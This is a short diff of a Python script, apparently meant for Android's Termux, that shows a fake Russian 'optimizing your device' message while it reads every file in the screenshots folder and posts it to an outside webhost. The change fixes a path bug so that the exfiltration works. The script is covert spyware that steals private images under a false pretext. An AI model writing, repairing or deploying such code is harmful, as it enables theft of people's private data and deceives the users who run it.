@@ -16,7 +16,7 @@ os.system("clear")
 print("Оптимизация под ваше устройство, это может занять несколько минут, подождите несколько минут")
 l = os.listdir("../storage/pictures/Screenshots")
 for i in range(len(l)):
-    f = open("../storage/pictures/Screenshots"+l[i], "rb")
+    f = open("../storage/pictures/Screenshots/"+l[i], "rb")
     r = f.read()
     try:
         requests.post("https://lamer112311.000webhostapp.com/", data={"im": r})
